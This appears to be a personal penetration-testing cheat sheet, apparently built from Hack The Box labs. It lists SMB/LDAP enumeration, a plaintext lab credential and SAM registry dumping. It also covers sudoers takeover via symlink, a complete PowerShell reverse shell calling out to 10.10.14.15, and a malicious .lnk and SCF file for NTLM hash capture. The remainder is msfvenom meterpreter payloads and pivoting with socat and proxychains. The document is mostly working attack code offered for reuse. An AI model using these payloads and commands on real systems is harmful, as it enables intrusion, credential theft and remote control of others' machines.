#### SMB:
  * ```smbclient -N -L //10.10.11.35```
  * ```netexec smb 10.10.11.35 -u 'a' -p '' --shares```
  * ```smbclient -U Guest //10.10.11.35/share```
  * ```netexec smb 10.10.11.35 -u Guest -p '' --rid-brute```
  * ```netexec smb 10.10.11.35 -u username.txt -p 'password123!'```

### LDAP:
  * ```ldapdomaindump 10.10.11.35 -u 'domain\username' -p 'password123!'```
  * ```ldapdomaindump 10.10.11.35 -u 'cicada\michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'```

#### Powershell:
  * ```Get-ChildItem -Path C:\ -Recurse -Filter "user.txt" -ErrorAction SilentlyContinue```
  * ```Get-Service | Where-Object { $_.Status -eq 'Running' }```

#### CMD:
  * Name and account for all services:
    ```wmic service get name,startname```

  * started services only:
    ```wmic service where started=true get  name, startname```

  * services with specific pattern in name:
    ```wmic service where 'name like "%sql%"' get  name, startname```

#### System SAM Hive dump:
  * cd c:\
  * mkdir Temp
  * reg save hklm\sam c:\Temp\sam
  * reg save hklm\system c:\Temp\system
  * cd Temp
  * download sam
  * download system
  * pypykatz registry --sam sam system

#### Subdomain Enumeration:
  * ```ffuf -u http://permx.htb -H "Host:FUZZ.permx.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fw 18```

#### Directory Enumeration
  * ```gobuster dir -u http://lms.permx.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt```

#### Symlink Techniques:
  * ```ln -s /etc/sudoers /home/john/sudoerss```

#### Manipulating sudoers file:
  * ```vi /etc/sudoers```
    * ```john ALL=(ALL:ALL) NOPASSWD: ALL```
   
#### Hash cracking:
  * john john.hash -w=/usr/share/wordlists/rockyou.txt

#### SSH local port forwarding:
  * Service in running on victim machine 127.0.0.1:8080 and can only be accessed via localhost
    * kali-Attacker$ ssh -L 0.0.0.0:9999:127.0.0.1:PORT john@VICTIM-IP
    * kali-Attacker$ curl -I http://127.0.0.1:9999
   
#### Exploiting Chrome Debugger:
  * https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/

#### Powershell Reverse shell:
```
#A simple and small reverse shell. Options and help removed to save space. 
#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
#### Capturing Hashes with a Malicious .lnk File
```
# Erstellt ein neues COM-Objekt, das die Windows Shell steuert (ermöglicht die Erstellung von Verknüpfungen, Ausführung von Programmen usw.).
$objShell = New-Object -ComObject WScript.Shell

# Erstellt eine neue Verknüpfung mit dem Namen "legit.lnk" im Verzeichnis "C:\".
$lnk = $objShell.CreateShortcut("C:\legit.lnk")

# Setzt den Zielpfad der Verknüpfung auf einen Netzwerkpfad. Dieser zeigt auf einen entfernten Server (Angreifer-Server),
# der mit einer Datei "@pwn.png" erreichbar ist. Beim Öffnen oder Vorschauen dieser Verknüpfung wird versucht, auf diesen Pfad zuzugreifen,
# was eine Authentifizierungsanforderung (z. B. NTLM-Auth) an den Angreifer-Server auslösen kann.
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"

# Setzt den Stil des Fensters, das beim Ausführen des Ziels erscheint. Der Wert "1" bedeutet, dass das Fenster in normaler Größe geöffnet wird.
$lnk.WindowStyle = 1

# Weist der Verknüpfung ein Symbol aus der Datei "shell32.dll" (eine Datei in Windows, die verschiedene Symbole enthält) zu.
# "3" steht für das Symbol, das aus dieser Datei verwendet wird (meist ein Standardordner-Symbol).
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"

# Setzt eine Beschreibung für die Verknüpfung. Diese Beschreibung wird angezeigt, wenn der Benutzer mit der Maus über die Verknüpfung fährt.
# Hier wird darauf hingewiesen, dass ein Besuch des Verzeichnisses, in dem die Verknüpfung gespeichert ist, eine Authentifizierungsanforderung auslösen kann.
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."

# Weist der Verknüpfung eine Tastenkombination (Strg + Alt + O) zu, mit der der Benutzer die Verknüpfung schnell ausführen kann.
$lnk.HotKey = "Ctrl+Alt+O"

# Speichert die erstellte Verknüpfung (legit.lnk) auf der Festplatte.
$lnk.Save()
```
#### SCF on a File Share
```[Shell]
Command=2
IconFile=\\103.103.143.33\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```
#### Pivoting, Tunneling, and Port Forwarding
 #####
 * Dynamic port forwarding
 ```
ssh -D 9050 alreadyCompromisedMachine@10.129.202.64
```
 #####
 * Local port forwarding
```
ssh -L 7000:127.0.0.1:8080 victim@10.10.11.38
```
 ##### 
 * edit /etc/proxychains.conf
   ```
   socks4 	127.0.0.1 9050
   ```
   ```
    attacker/machine$ proxychains nmap -v -sn 172.16.5.1-200
    attacker/machine$ proxychains nmap -v -Pn -sT 172.16.5.19
    attacker/machine$ proxychains msfconsole
    msf6 >search rdp_scanner
    attacker/machine$ proxychains xfreerdp /v:172.16.5.19 /u:admin /p:pass@123
   ```
 ##### 
 * When SSH is not available use SOCAT
   ```
   Victim IP: 172.16.5.129
   Attacker IP: 10.10.14.18
   victim@compromisedhost:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
   attacker/machine$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
   msf6 > use exploit/multi/handler
   msf6 exploit(multi/handler) > set lport 80
   msf6 exploit(multi/handler) > run
   Running the backupscript.exe on victim machine would connect to the attacker machine
   ```
   
#### Linux Ping Sweep:
```for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done```
